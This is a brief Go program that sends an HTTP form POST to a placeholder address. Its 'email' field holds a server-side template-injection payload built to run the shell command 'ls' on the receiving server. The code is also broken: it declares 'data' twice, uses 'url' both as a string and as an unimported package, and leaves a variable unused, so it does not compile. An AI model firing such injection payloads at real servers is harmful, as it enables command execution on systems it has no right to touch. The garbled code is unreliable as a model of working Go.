package main

import (
	"fmt"
	"log"
	"net/http"
	"os/user"
)

func main() {

	url := fmt.Sprintf("ip")
	data := `{"":"value1"}`

	currentUser, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	data := url.Values{}
	data.Set("email", "{% import os %}{{os.system('ls')}}")

	resp, err := http.PostForm(url, data)
	if err != nil {
		log.Fatal("Error sending request. ", err)
	}
	defer resp.Body.Close()

	fmt.Println("response status:", resp.Status)
}
